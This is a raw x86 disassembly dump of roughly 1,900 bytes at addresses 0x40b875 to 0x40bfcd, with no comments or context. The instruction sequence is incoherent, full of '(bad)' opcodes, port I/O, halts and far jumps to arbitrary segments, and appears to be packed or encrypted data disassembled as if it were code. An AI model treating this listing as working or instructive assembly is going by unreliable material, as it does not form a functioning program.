  40b875:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b876:	pop    edx
  40b877:	cwde   
  40b878:	inc    esp
  40b879:	push   es
  40b87a:	enter  0x9411,0x89
  40b87e:	add    bh,BYTE PTR [esi-0x7be17098]
  40b884:	xor    al,0xd
  40b886:	sti    
  40b887:	cwde   
  40b888:	add    al,BYTE PTR [edx+0x57825a62]
  40b88e:	(bad)  
  40b890:	or     al,0xd7
  40b892:	mov    ds:0x6a8dba15,eax
  40b897:	cdq    
  40b898:	cmp    eax,ecx
  40b89a:	popf   
  40b89b:	mov    edi,0x612b642d
  40b8a0:	xor    eax,0xc13402e0
  40b8a5:	xchg   ebx,eax
  40b8a6:	push   esp
  40b8a7:	add    al,0xde
  40b8a9:	sub    BYTE PTR [eax],dl
  40b8ab:	mov    esp,0x1e8ce754
  40b8b0:	ret    0xb5ff
  40b8b3:	sbb    DWORD PTR [edx],edi
  40b8b5:	pop    eax
  40b8b6:	dec    esi
  40b8b7:	add    ch,ch
  40b8b9:	repnz inc edi
  40b8bb:	inc    eax
  40b8bc:	jg     0x40b8aa
  40b8be:	mov    edx,0x8dc2ae47
  40b8c3:	sbb    edx,DWORD PTR [eax-0x757ba05c]
  40b8c9:	sub    eax,0x45428ad4
  40b8ce:	or     al,0xe0
  40b8d0:	(bad)  
  40b8d1:	imul   ebx,edi,0xffffff82
  40b8d4:	ins    DWORD PTR es:[edi],dx
  40b8d5:	neg    ecx
  40b8d7:	fdiv   DWORD PTR [ebp+0x7ff186e6]
  40b8dd:	mov    esi,0xbbfced4b
  40b8e2:	mov    ch,ch
  40b8e4:	cmp    eax,0x3affb37f
  40b8e9:	pop    eax
  40b8ea:	mov    ch,0x42
  40b8ec:	(bad)  
  40b8ed:	xchg   esp,eax
  40b8ee:	stc    
  40b8ef:	(bad)  
  40b8f0:	out    dx,al
  40b8f1:	std    
  40b8f2:	jb     0x40b895
  40b8f4:	dec    edx
  40b8f5:	sahf   
  40b8f6:	stos   BYTE PTR es:[edi],al
  40b8f7:	cmp    DWORD PTR [edi],0x80be5358
  40b8fd:	push   DWORD PTR [ebp+edx*8-0x22]
  40b901:	call   0x31a49f61
  40b906:	sub    al,al
  40b908:	pop    esi
  40b909:	popf   
  40b90a:	jo     0x40b890
  40b90c:	rcr    bh,1
  40b90e:	sbb    DWORD PTR [edx],ebp
  40b910:	(bad)  
  40b912:	mov    al,ds:0x5b7db3e9
  40b917:	sub    ch,BYTE PTR [edx]
  40b919:	inc    edi
  40b91a:	aam    0x17
  40b91c:	add    al,0x59
  40b91e:	imul   eax,DWORD PTR [esi+ebx*1+0x3ecc285e],0xa33fcb17
  40b929:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b92a:	repnz int 0x8f
  40b92d:	out    0x78,eax
  40b92f:	xor    esi,0xd
  40b932:	fnsave [ebp+0x65a79fa9]
  40b938:	out    dx,al
  40b939:	dec    esi
  40b93a:	push   esp
  40b93b:	aam    0xbf
  40b93d:	mov    BYTE PTR [edi+esi*2+0x450ce764],bl
  40b944:	out    0x12,al
  40b946:	and    al,0x42
  40b948:	repz retf 0x7ea4
  40b94c:	or     eax,0x4645be2
  40b951:	scas   al,BYTE PTR es:[edi]
  40b952:	jo     0x40b92f
  40b954:	cwde   
  40b955:	leave  
  40b956:	leave  
  40b957:	xchg   BYTE PTR [eax],cl
  40b959:	test   al,0x44
  40b95b:	std    
  40b95c:	xchg   ebx,eax
  40b95d:	jae    0x40b93a
  40b95f:	xor    al,0xd2
  40b961:	fstp   DWORD PTR [edx-0x58]
  40b964:	and    ebp,ecx
  40b966:	xchg   ebx,eax
  40b967:	add    al,0x8e
  40b969:	jmp    0x40b947
  40b96b:	test   DWORD PTR [edi],esp
  40b96d:	ret    0xa8a5
  40b970:	addr16 mov cl,0x7f
  40b973:	fs dec ebp
  40b975:	out    0xa4,eax
  40b977:	fnsave [ebx+0x77]
  40b97a:	inc    esi
  40b97b:	jno    0x40b985
  40b97d:	jecxz  0x40b929
  40b97f:	adc    ebp,DWORD PTR [edx-0x34]
  40b982:	xchg   ecx,eax
  40b983:	mov    edx,0xd37fe0ff
  40b988:	sahf   
  40b989:	sub    DWORD PTR [ebx],eax
  40b98b:	sbb    eax,0x5718ad38
  40b990:	ret    0x8f42
  40b993:	jb     0x40b990
  40b995:	mul    esp
  40b997:	je     0x40b9c1
  40b999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b99a:	push   ebx
  40b99b:	test   BYTE PTR [edx+0x4f15a455],ah
  40b9a1:	mov    ecx,0x9dc73fbd
  40b9a6:	fiadd  DWORD PTR [ebp+0x1ab78ec7]
  40b9ac:	pop    ds
  40b9ad:	out    0x74,al
  40b9af:	mov    ch,0xe6
  40b9b1:	add    esp,DWORD PTR [edx]
  40b9b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b4:	aad    0x9b
  40b9b6:	push   ecx
  40b9b7:	faddp  st(5),st
  40b9b9:	outs   dx,BYTE PTR ds:[esi]
  40b9ba:	pop    edx
  40b9bb:	cmp    BYTE PTR [ecx+0xd],0x13
  40b9bf:	push   ecx
  40b9c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9c1:	out    dx,al
  40b9c2:	xlat   BYTE PTR ds:[ebx]
  40b9c3:	test   DWORD PTR [edx],edx
  40b9c5:	push   ds
  40b9c6:	push   esi
  40b9c7:	sbb    BYTE PTR [ecx],bh
  40b9c9:	dec    ebp
  40b9ca:	shr    BYTE PTR [eax],1
  40b9cc:	ins    DWORD PTR es:[edi],dx
  40b9cd:	mov    eax,0xf225332e
  40b9d2:	repz hlt 
  40b9d4:	push   edx
  40b9d5:	jns    0x40b9e8
  40b9d7:	test   BYTE PTR [edi+ecx*8+0x1d3e5a7a],dh
  40b9de:	outs   dx,BYTE PTR ds:[esi]
  40b9df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9e0:	mov    ds:0xd4942d6e,al
  40b9e5:	out    0xe2,eax
  40b9e7:	add    al,0x26
  40b9e9:	stc    
  40b9ea:	mov    ecx,0xfd7282cd
  40b9ef:	jge    0x40ba13
  40b9f1:	inc    esi
  40b9f2:	pop    ebx
  40b9f3:	call   0xd6a9f52e
  40b9f8:	clc    
  40b9f9:	(bad)  
  40b9fa:	xchg   esp,eax
  40b9fb:	std    
  40b9fc:	mov    eax,0x26bd5a13
  40ba01:	xor    eax,0xc63baff1
  40ba06:	pop    edx
  40ba07:	ror    BYTE PTR [esi],0xdf
  40ba0a:	dec    edi
  40ba0b:	stos   DWORD PTR es:[edi],eax
  40ba0c:	jb     0x40b9ff
  40ba0e:	xlat   BYTE PTR ds:[ebx]
  40ba0f:	test   DWORD PTR [ebx+0x3fd6409c],edi
  40ba15:	rcl    DWORD PTR [esi+edx*1+0x23f8396f],0xf
  40ba1d:	out    0x90,al
  40ba1f:	mov    dl,0x27
  40ba21:	dec    eax
  40ba22:	int    0xb9
  40ba24:	lock pop esp
  40ba26:	xchg   DWORD PTR [ebx-0x41a540a8],ebp
  40ba2c:	cmc    
  40ba2d:	les    ecx,FWORD PTR [edx+0x1caddea5]
  40ba33:	test   DWORD PTR [ebp-0x75],edi
  40ba36:	pop    es
  40ba37:	add    al,0x3f
  40ba39:	push   ecx
  40ba3a:	(bad)  
  40ba3b:	call   0xfa75:0x50318333
  40ba42:	push   es
  40ba43:	sti    
  40ba44:	push   cs
  40ba45:	lods   eax,DWORD PTR ds:[esi]
  40ba46:	adc    al,0xcd
  40ba48:	sbb    bh,BYTE PTR [ecx-0x1cc13de5]
  40ba4e:	xchg   DWORD PTR [ebx+0x52a05db8],edi
  40ba54:	cwde   
  40ba55:	inc    DWORD PTR cs:[esi+0x6e]
  40ba59:	fisub  DWORD PTR [edx+ebx*4+0x315b1ebf]
  40ba60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ba61:	inc    esp
  40ba62:	mov    edi,0x5ac4112c
  40ba67:	pushf  
  40ba68:	sub    BYTE PTR [esi-0xc],dl
  40ba6b:	adc    ecx,eax
  40ba6d:	clc    
  40ba6e:	dec    eax
  40ba6f:	repnz inc BYTE PTR [edx]
  40ba72:	pop    eax
  40ba73:	sub    edi,DWORD PTR [esi]
  40ba75:	dec    bx
  40ba77:	jecxz  0x40baa6
  40ba79:	ja     0x40ba57
  40ba7b:	fst    QWORD PTR [ecx+eiz*8+0x77b90ee1]
  40ba82:	aas    
  40ba83:	mov    ebp,0x9d80e65b
  40ba88:	aaa    
  40ba89:	add    ebp,esp
  40ba8b:	and    eax,eax
  40ba8d:	push   edx
  40ba8e:	sub    dl,cl
  40ba90:	fcos   
  40ba92:	pop    edx
  40ba93:	sbb    al,0xa3
  40ba95:	ficom  DWORD PTR [edi-0x15]
  40ba98:	bound  eax,QWORD PTR ds:[esi-0x23851e7b]
  40ba9f:	adc    BYTE PTR [edi],bh
  40baa1:	std    
  40baa2:	shl    BYTE PTR [eax+0x38d90fde],0x2
  40baa9:	call   0xdeea:0xec3fce06
  40bab0:	sub    eax,0x3e170785
  40bab5:	inc    edi
  40bab6:	imul   esi,DWORD PTR [edi],0xffffffeb
  40bab9:	xchg   esp,eax
  40baba:	push   esi
  40babb:	pusha  
  40babc:	push   edi
  40babd:	out    0xbc,eax
  40babf:	mov    ds:0xf01f311e,eax
  40bac4:	adc    DWORD PTR [edx],eax
  40bac6:	scas   al,BYTE PTR es:[edi]
  40bac7:	je     0x40babe
  40bac9:	bound  esp,QWORD PTR [eax+ebx*4+0x40]
  40bacd:	cld    
  40bace:	fisttp DWORD PTR [edx+0x77]
  40bad1:	hlt    
  40bad2:	mov    esi,0x792f5f5b
  40bad7:	mov    ch,0xbd
  40bad9:	mov    esp,0x613e1e5b
  40bade:	in     al,dx
  40badf:	les    ebp,FWORD PTR [ebp+0x5f]
  40bae2:	leave  
  40bae3:	and    dh,BYTE PTR [ebx-0x180c6919]
  40bae9:	ss jns 0x40bb2b
  40baec:	fs pop ecx
  40baee:	inc    eax
  40baef:	mov    eax,DWORD PTR [edi]
  40baf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40baf2:	pop    edx
  40baf3:	pusha  
  40baf4:	or     ecx,DWORD PTR [esi]
  40baf6:	stos   DWORD PTR es:[edi],eax
  40baf7:	or     BYTE PTR [esi-0x1578b4ea],0x45
  40bafe:	adc    DWORD PTR [eax],edi
  40bb00:	pop    ds
  40bb01:	es es push ds
  40bb04:	mov    DWORD PTR ds:[edi+0x6783fe64],eax
  40bb0b:	jno    0x40bb7d
  40bb0d:	fbstp  TBYTE PTR [eax+0x1667bff0]
  40bb13:	rcr    bl,1
  40bb15:	sub    DWORD PTR [esp+ebx*8+0x760a2f3f],ebx
  40bb1c:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  40bb1e:	je     0x40bb7e
  40bb20:	or     ah,dh
  40bb22:	les    esi,FWORD PTR ds:0x52c887ee
  40bb28:	mov    eax,0xd83864fd
  40bb2d:	push   ecx
  40bb2e:	pop    ebx
  40bb2f:	jo     0x40bb14
  40bb31:	jno    0x40bb4f
  40bb33:	dec    edx
  40bb34:	push   esp
  40bb35:	jg     0x40baee
  40bb37:	xchg   esi,eax
  40bb38:	xor    al,0x84
  40bb3a:	inc    eax
  40bb3b:	mov    eax,ds:0x842fe2cf
  40bb40:	aas    
  40bb41:	scas   eax,DWORD PTR es:[edi]
  40bb42:	mov    ebx,ebx
  40bb44:	fsubp  st(0),st
  40bb46:	or     BYTE PTR [esi],bl
  40bb48:	arpl   dx,bx
  40bb4a:	bnd jg 0x40bba7
  40bb4d:	(bad)  
  40bb4f:	sub    edi,DWORD PTR [ecx-0x6f]
  40bb52:	mov    ecx,0x36b2c105
  40bb57:	xchg   edi,eax
  40bb58:	out    0x64,al
  40bb5a:	pop    edx
  40bb5b:	jp     0x40bb30
  40bb5d:	jg     0x40bbcb
  40bb5f:	fidiv  WORD PTR [esp+eiz*2-0x7f]
  40bb63:	xor    eax,0x965ac5e8
  40bb68:	stos   BYTE PTR es:[edi],al
  40bb69:	jecxz  0x40bb79
  40bb6b:	out    0x3e,eax
  40bb6d:	or     DWORD PTR [edi+0x66ea2ed5],esp
  40bb73:	fisub  WORD PTR [ebx]
  40bb75:	icebp  
  40bb76:	push   edx
  40bb77:	nop
  40bb78:	pop    ecx
  40bb79:	nop
  40bb7a:	xlat   BYTE PTR ds:[ebx]
  40bb7b:	loopne 0x40bbad
  40bb7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb7e:	push   ebp
  40bb7f:	mov    bl,0x1f
  40bb81:	mov    BYTE PTR [ebx],dh
  40bb83:	or     eax,0xbd97513f
  40bb88:	xchg   esi,eax
  40bb89:	pop    esp
  40bb8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb8b:	add    eax,0x1748f4cc
  40bb90:	ins    DWORD PTR es:[edi],dx
  40bb91:	repz repz pop esi
  40bb94:	iret   
  40bb95:	mov    DWORD PTR [ebx+0x52],ebx
  40bb98:	ds das 
  40bb9a:	mov    edx,0x4b7cbd43
  40bb9f:	or     eax,0xdf7ae7b0
  40bba4:	adc    DWORD PTR [ecx],esp
  40bba6:	aas    
  40bba7:	lods   eax,DWORD PTR ds:[esi]
  40bba8:	iret   
  40bba9:	xchg   esp,eax
  40bbaa:	lods   eax,DWORD PTR ds:[esi]
  40bbab:	mov    dh,0xd4
  40bbad:	sahf   
  40bbae:	pop    ebx
  40bbaf:	push   cs
  40bbb0:	xchg   DWORD PTR [edx+ebp*8],ebx
  40bbb3:	lea    esp,[esi-0xe647105]
  40bbb9:	jp     0x40bc26
  40bbbb:	jmp    0x40bc08
  40bbbd:	lock xchg ebp,eax
  40bbbf:	les    edi,FWORD PTR [edi]
  40bbc1:	f2xm1  
  40bbc3:	inc    eax
  40bbc4:	jge    0x40bb6d
  40bbc6:	dec    edi
  40bbc7:	dec    ebx
  40bbc8:	shl    bh,0xb4
  40bbcb:	ja     0x40bc1c
  40bbcd:	rcl    BYTE PTR [esi-0x489198cc],0xdb
  40bbd4:	mov    eax,0x168a5d07
  40bbd9:	jbe    0x40bbfa
  40bbdb:	cmp    cl,BYTE PTR [esi]
  40bbdd:	out    0x6c,al
  40bbdf:	out    dx,eax
  40bbe0:	add    DWORD PTR ds:0x762a5e94,0xffffff9e
  40bbe7:	xchg   esi,eax
  40bbe8:	pop    ecx
  40bbe9:	push   edx
  40bbea:	push   eax
  40bbeb:	dec    esi
  40bbec:	cmp    DWORD PTR [ebp-0x29],ecx
  40bbef:	jb     0x40bb8f
  40bbf1:	pop    ss
  40bbf2:	jae    0x40bc6b
  40bbf4:	(bad)  
  40bbf5:	out    0xb0,eax
  40bbf7:	add    ebp,DWORD PTR [ecx+0x46ba1ce1]
  40bbfd:	dec    esi
  40bbfe:	shld   DWORD PTR [edi],edi,0x55
  40bc02:	sub    ah,BYTE PTR [edi]
  40bc04:	pop    es
  40bc05:	cld    
  40bc06:	xchg   ecx,eax
  40bc07:	mov    eax,0x5826e80f
  40bc0c:	sbb    BYTE PTR [edi-0x4c6b177e],bl
  40bc12:	mov    eax,DWORD PTR [ecx+edx*8+0x23]
  40bc16:	sbb    DWORD PTR [ecx+0x64cff9e],esp
  40bc1c:	jae    0x40bc51
  40bc1e:	xor    BYTE PTR [eax+esi*1+0x2042cce6],al
  40bc25:	(bad)  
  40bc26:	mov    ds:0x8de3c9b6,eax
  40bc2b:	mov    edx,0x5c5ac923
  40bc30:	mov    cl,0xa9
  40bc32:	cmp    al,0x83
  40bc34:	mov    dl,BYTE PTR [ebx+0x2f]
  40bc37:	cdq    
  40bc38:	mov    esi,0xee1605e8
  40bc3d:	fldenv [eax]
  40bc3f:	xchg   DWORD PTR [ecx+0x4b],edi
  40bc42:	pop    ebx
  40bc43:	adc    al,0xbf
  40bc45:	push   ds
  40bc46:	fnstsw WORD PTR [ebx]
  40bc48:	imul   esp,edi,0x1cbd511e
  40bc4e:	iretw  
  40bc50:	call   DWORD PTR ds:0x3744b79d
  40bc56:	pop    edx
  40bc57:	in     al,dx
  40bc58:	(bad)  
  40bc59:	in     eax,dx
  40bc5a:	std    
  40bc5b:	ins    BYTE PTR es:[edi],dx
  40bc5c:	ss pusha 
  40bc5e:	lahf   
  40bc5f:	test   DWORD PTR [eax+0x4778df47],ecx
  40bc65:	or     DWORD PTR [edi-0x7b],esp
  40bc68:	popa   
  40bc69:	fbld   TBYTE PTR [ebp+eax*4-0x7e]
  40bc6d:	sub    BYTE PTR [eax+0x29b2087e],al
  40bc73:	mov    ch,BYTE PTR [edx-0x743e28b3]
  40bc79:	(bad)  
  40bc7a:	daa    
  40bc7b:	test   DWORD PTR [esi],edi
  40bc7d:	fstp   DWORD PTR [edx+0x3b]
  40bc80:	out    0x2a,eax
  40bc82:	cs arpl ax,dx
  40bc85:	out    0xb8,al
  40bc87:	cwde   
  40bc88:	aad    0x76
  40bc8a:	inc    ebx
  40bc8b:	dec    edx
  40bc8c:	es mov dl,0x9c
  40bc8f:	push   es
  40bc90:	out    dx,al
  40bc91:	loopne 0x40bcee
  40bc93:	jle    0x40bd04
  40bc95:	mov    WORD PTR ds:0x448fc84,cs
  40bc9b:	test   BYTE PTR [edi-0x7a],dl
  40bc9e:	iret   
  40bc9f:	sar    DWORD PTR [edi],cl
  40bca1:	jmp    FWORD PTR [ebx+0x3]
  40bca4:	dec    eax
  40bca5:	hlt    
  40bca6:	inc    edi
  40bca7:	jns    0x40bc6e
  40bca9:	out    0x84,eax
  40bcab:	adc    eax,0x0
  40bcae:	jnp    0x40bcb0
  40bcb0:	sbb    DWORD PTR [edi-0x70d346dd],edi
  40bcb6:	mov    al,ds:0xd8e766c0
  40bcbb:	mov    ebx,0xd52c40ef
  40bcc0:	mov    BYTE PTR [ebp+0x73beff51],al
  40bcc6:	pop    ebx
  40bcc7:	jmp    0x40bcae
  40bcc9:	cli    
  40bcca:	loope  0x40bca4
  40bccc:	(bad)  
  40bcce:	push   edx
  40bccf:	pop    edx
  40bcd0:	aas    
  40bcd1:	push   ds
  40bcd2:	mov    ds:0xa4112f6d,eax
  40bcd7:	je     0x40bc85
  40bcd9:	rcl    BYTE PTR [edx],cl
  40bcdb:	test   DWORD PTR [ebx+0x46],ebp
  40bcde:	nop
  40bcdf:	sub    bh,BYTE PTR [edi]
  40bce1:	pop    ds
  40bce2:	xchg   esp,edx
  40bce4:	test   eax,0x68f68c49
  40bce9:	cwde   
  40bcea:	out    dx,al
  40bceb:	nop
  40bcec:	notrack call DWORD PTR [edi]
  40bcef:	(bad)  
  40bcf0:	fisttp DWORD PTR [eax-0x602330af]
  40bcf6:	icebp  
  40bcf7:	stos   BYTE PTR es:[edi],al
  40bcf8:	mov    bl,BYTE PTR ds:0x41d5d25a
  40bcfe:	mov    bh,0xc9
  40bd00:	add    BYTE PTR [ebp+0x27],cl
  40bd03:	mov    ?,WORD PTR [eax-0x19]
  40bd06:	in     eax,dx
  40bd07:	adc    DWORD PTR [ecx],0xffffffd6
  40bd0a:	iret   
  40bd0b:	mov    ebx,DWORD PTR ds:0xfff2555d
  40bd11:	jmp    0x9312:0xe66d9c98
  40bd18:	in     eax,0x96
  40bd1a:	shr    DWORD PTR [ebp-0x39cd95c7],1
  40bd20:	or     ah,BYTE PTR [eax+0x5a]
  40bd23:	mov    dl,0x93
  40bd25:	push   0x846647fe
  40bd2a:	jmp    0x3eb:0x8daabe85
  40bd31:	sub    eax,0x183f2760
  40bd36:	inc    esp
  40bd37:	loop   0x40bda6
  40bd39:	mov    ds:0x461a2a06,eax
  40bd3e:	sbb    eax,0xb6637386
  40bd43:	test   BYTE PTR [ebx+edi*1+0x11],cl
  40bd47:	inc    esp
  40bd48:	inc    eax
  40bd49:	aad    0x5b
  40bd4b:	cwde   
  40bd4c:	dec    esi
  40bd4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bd4e:	cmp    BYTE PTR [ebp+0x7bce06ba],dl
  40bd54:	rcr    BYTE PTR [ecx],cl
  40bd56:	xlat   BYTE PTR ds:[ebx]
  40bd57:	or     BYTE PTR [ebx+0x51bb5e72],0xca
  40bd5e:	sbb    ch,BYTE PTR ds:0xc65ba8a2
  40bd64:	push   ebp
  40bd65:	add    BYTE PTR [edx],cl
  40bd67:	icebp  
  40bd68:	call   0x49c5b9d5
  40bd6d:	call   0xb97ff9f2
  40bd72:	fbstp  TBYTE PTR [eax+0x6d]
  40bd75:	dec    esp
  40bd76:	push   ecx
  40bd77:	stos   BYTE PTR es:[edi],al
  40bd78:	adc    ah,dh
  40bd7a:	les    esi,FWORD PTR [ebp+0x40bbfd39]
  40bd80:	ret    
  40bd81:	shl    al,1
  40bd83:	xor    DWORD PTR [ebx+0x327a5a19],eax
  40bd89:	(bad)  
  40bd8a:	or     esp,DWORD PTR [esi+0x5e]
  40bd8d:	fistp  WORD PTR [ecx-0x6d]
  40bd90:	cmp    DWORD PTR [esp+ebx*2],eax
  40bd93:	jmp    0xf3f:0x81119aae
  40bd9a:	xchg   DWORD PTR [ebx+0x296e7f8b],ebx
  40bda0:	and    al,0xe6
  40bda2:	fs test cl,0x6b
  40bda6:	pop    ebp
  40bda7:	in     eax,dx
  40bda8:	sbb    eax,0x315e1cf7
  40bdad:	imul   ebx,DWORD PTR [edx+0x4a],0xa02bc320
  40bdb4:	enter  0xe348,0x82
  40bdb8:	inc    edx
  40bdb9:	push   eax
  40bdba:	shl    BYTE PTR [ebp+0x53],cl
  40bdbd:	mov    eax,0xe176337b
  40bdc2:	retf   0x968a
  40bdc5:	stos   BYTE PTR es:[edi],al
  40bdc6:	test   al,0x9
  40bdc8:	fwait
  40bdc9:	aaa    
  40bdca:	test   BYTE PTR [edx+ebx*8+0xa849583],0x85
  40bdd2:	add    BYTE PTR [esi],al
  40bdd4:	aas    
  40bdd5:	xchg   ebp,eax
  40bdd6:	popa   
  40bdd7:	fcos   
  40bdd9:	add    BYTE PTR [ecx-0x71],0x71
  40bddd:	out    0xf2,eax
  40bddf:	push   esp
  40bde0:	loopne 0x40be3c
  40bde2:	xor    al,0xfd
  40bde4:	sub    bh,BYTE PTR [eax+edi*2+0x5aab85a3]
  40bdeb:	out    dx,al
  40bdec:	jecxz  0x40bdc7
  40bdee:	or     eax,0x24255898
  40bdf3:	test   esp,edx
  40bdf5:	and    al,0x95
  40bdf7:	push   0x5f5b1ec3
  40bdfc:	inc    esp
  40bdfd:	loopne 0x40be59
  40bdff:	les    esp,FWORD PTR [esi+0x39]
  40be02:	inc    edx
  40be03:	sub    eax,esi
  40be05:	gs lock cwde 
  40be08:	ds xchg esp,eax
  40be0a:	lahf   
  40be0b:	add    eax,DWORD PTR [ecx+0x9a94dab]
  40be11:	jne    0x40be77
  40be13:	dec    edx
  40be14:	or     eax,0xeb585b42
  40be19:	out    0xe,al
  40be1b:	lods   al,BYTE PTR ds:[esi]
  40be1c:	mov    dh,BYTE PTR [esi]
  40be1e:	pop    eax
  40be1f:	mov    ds:0x33be58b8,eax
  40be24:	ins    DWORD PTR es:[edi],dx
  40be25:	fldenv [ebp+0x5afdb705]
  40be2b:	mov    bh,BYTE PTR [esi]
  40be2d:	pop    esp
  40be2e:	adc    bh,dl
  40be30:	test   al,0xad
  40be32:	gs stos BYTE PTR es:[edi],al
  40be34:	pop    esi
  40be35:	ins    BYTE PTR es:[edi],dx
  40be36:	sub    BYTE PTR [eax+eiz*2-0x25d13baa],al
  40be3d:	sbb    eax,0x49faf387
  40be42:	pop    ebx
  40be43:	out    dx,al
  40be44:	ja     0x40be11
  40be46:	pop    esi
  40be47:	lods   eax,DWORD PTR ds:[esi]
  40be48:	xchg   esp,eax
  40be49:	cmp    al,0x3f
  40be4b:	xchg   BYTE PTR [edi+0xb],dl
  40be4e:	jg     0x40be46
  40be50:	repz xchg ebx,eax
  40be52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40be53:	and    eax,0x165b36a8
  40be58:	fnstsw WORD PTR [ebx]
  40be5a:	push   edi
  40be5b:	inc    ebp
  40be5c:	and    BYTE PTR [edx+0x40],al
  40be5f:	test   al,0x92
  40be61:	xchg   dh,dl
  40be63:	xchg   bl,bl
  40be65:	jge    0x40be72
  40be67:	in     al,dx
  40be68:	js     0x40bee1
  40be6a:	adc    eax,0x5b632d65
  40be6f:	fcomp  DWORD PTR [esi]
  40be71:	js     0x40bed4
  40be73:	mov    esi,DWORD PTR [esi-0xf]
  40be76:	and    DWORD PTR [ebp-0x4f847711],eax
  40be7c:	pop    es
  40be7d:	mov    eax,ds:0x75399cf2
  40be82:	repnz pop edi
  40be84:	xchg   ecx,eax
  40be85:	push   edi
  40be86:	xchg   ebp,eax
  40be87:	aad    0x7b
  40be89:	out    0xe6,eax
  40be8b:	movsx  ebp,BYTE PTR [eax]
  40be8e:	pop    eax
  40be8f:	hlt    
  40be90:	test   eax,0xeec6475e
  40be95:	sti    
  40be96:	pop    ebx
  40be97:	or     cl,dl
  40be99:	cmp    DWORD PTR [ecx],edi
  40be9b:	stos   DWORD PTR es:[edi],eax
  40be9c:	loop   0x40beb7
  40be9e:	add    edi,DWORD PTR [ebx+0x524a566]
  40bea4:	mov    al,ds:0x746cbc6
  40bea9:	cmc    
  40beaa:	push   esp
  40beab:	sub    al,dl
  40bead:	test   eax,0xca7e0b0b
  40beb2:	scas   eax,DWORD PTR es:[edi]
  40beb3:	jg     0x40bef1
  40beb5:	out    0x66,eax
  40beb7:	dec    ebx
  40beb8:	call   0x6bc9:0x59ed40b7
  40bebf:	in     al,dx
  40bec0:	leave  
  40bec1:	xchg   ebp,eax
  40bec2:	pop    ebx
  40bec3:	pushf  
  40bec4:	add    edx,DWORD PTR [ecx+0x205412be]
  40beca:	jo     0x40be99
  40becc:	lock adc al,0x2c
  40becf:	test   BYTE PTR [edi-0x25],dl
  40bed2:	lods   eax,DWORD PTR ds:[esi]
  40bed3:	jmp    0x8c9bee6e
  40bed8:	cmp    DWORD PTR [edx],ecx
  40beda:	mov    edi,0x685c7676
  40bedf:	call   0x19e4:0x869205fe
  40bee6:	or     al,0x25
  40bee8:	jb     0x40be8f
  40beea:	inc    ebp
  40beeb:	add    al,0x47
  40beed:	call   0xe68a047f
  40bef2:	loop   0x40bf42
  40bef4:	adc    ch,bh
  40bef6:	mov    ebx,0x91419c34
  40befb:	mov    WORD PTR [ebp-0x19],?
  40befe:	ret    0x8a1e
  40bf01:	aad    0xd2
  40bf03:	mov    cl,ah
  40bf05:	(bad)  [esi+0x73e7fcf4]
  40bf0b:	pop    esi
  40bf0c:	pop    esi
  40bf0d:	adc    ch,BYTE PTR [edx+0x27]
  40bf10:	aas    
  40bf11:	cmp    ebp,DWORD PTR [edi]
  40bf13:	push   edx
  40bf14:	mov    esi,0xf6b3b8e0
  40bf19:	out    0xf0,eax
  40bf1b:	aaa    
  40bf1c:	dec    esi
  40bf1d:	(bad)  
  40bf1e:	in     al,dx
  40bf1f:	add    ebp,DWORD PTR ds:0xfd3bd7c6
  40bf25:	mov    al,0x58
  40bf27:	add    cl,BYTE PTR [eax+0x2d4ef7]
  40bf2d:	out    0xfa,eax
  40bf2f:	cmp    eax,0xff3142f3
  40bf34:	(bad)  
  40bf35:	cmp    esi,DWORD PTR [edi+0x14]
  40bf38:	cmp    ebx,edi
  40bf3a:	pop    edx
  40bf3b:	hlt    
  40bf3c:	mov    ebx,0x8468f350
  40bf41:	ficomp WORD PTR [ebx-0x6f08317e]
  40bf47:	mov    esp,0x17ea79f9
  40bf4c:	ins    DWORD PTR es:[edi],dx
  40bf4d:	das    
  40bf4e:	push   ebp
  40bf4f:	push   esi
  40bf50:	inc    esp
  40bf52:	jmp    0x40bfa9
  40bf54:	enter  0xbefb,0xa2
  40bf58:	xchg   esp,eax
  40bf59:	pop    ebp
  40bf5a:	push   es
  40bf5b:	outs   dx,DWORD PTR ds:[esi]
  40bf5c:	(bad)  
  40bf5d:	rcr    edx,1
  40bf5f:	pop    eax
  40bf60:	(bad)  [edx]
  40bf62:	jge    0x40bf57
  40bf64:	mov    ebx,ecx
  40bf66:	pop    ebx
  40bf67:	push   ds
  40bf68:	fst    QWORD PTR [esi+ebx*8+0x60]
  40bf6c:	inc    esi
  40bf6d:	sbb    bl,BYTE PTR [edx-0x159bc17f]
  40bf73:	rcr    bh,0xee
  40bf76:	fidivr DWORD PTR [ebp-0x6ba4da1c]
  40bf7c:	mov    ss,esp
  40bf7e:	imul   eax,DWORD PTR [eax-0x7aaf73a4],0x3948b624
  40bf88:	idiv   BYTE PTR [eax+0x6]
  40bf8b:	sahf   
  40bf8c:	lods   al,BYTE PTR ds:[esi]
  40bf8d:	fcomp  QWORD PTR [edx-0x4e]
  40bf90:	lock inc ecx
  40bf92:	aam    0x8f
  40bf94:	dec    eax
  40bf95:	push   ss
  40bf96:	xor    DWORD PTR [ebp+0x6a9da8f6],eax
  40bf9c:	cmp    al,0x97
  40bf9e:	sub    DWORD PTR [eax-0x11],ebx
  40bfa1:	ficomp DWORD PTR [esi+0x7377bfd1]
  40bfa7:	icebp  
  40bfa8:	shl    ch,cl
  40bfaa:	aam    0x91
  40bfac:	pop    ebx
  40bfad:	jo     0x40bf6c
  40bfaf:	imul   edi,DWORD PTR [ebx+0x4e],0xffffff8d
  40bfb3:	mov    eax,0xe9a855c4
  40bfb8:	jns    0x40bf97
  40bfba:	data16 sbb ah,ch
  40bfbd:	pop    ss
  40bfbe:	fucomp st(5)
  40bfc0:	addr16 add edx,ecx
  40bfc3:	je     0x40bf91
  40bfc5:	nop
  40bfc6:	stc    
  40bfc7:	mov    esp,DWORD PTR ds:0x5cdf6527
  40bfcd:	sub    al,0x68
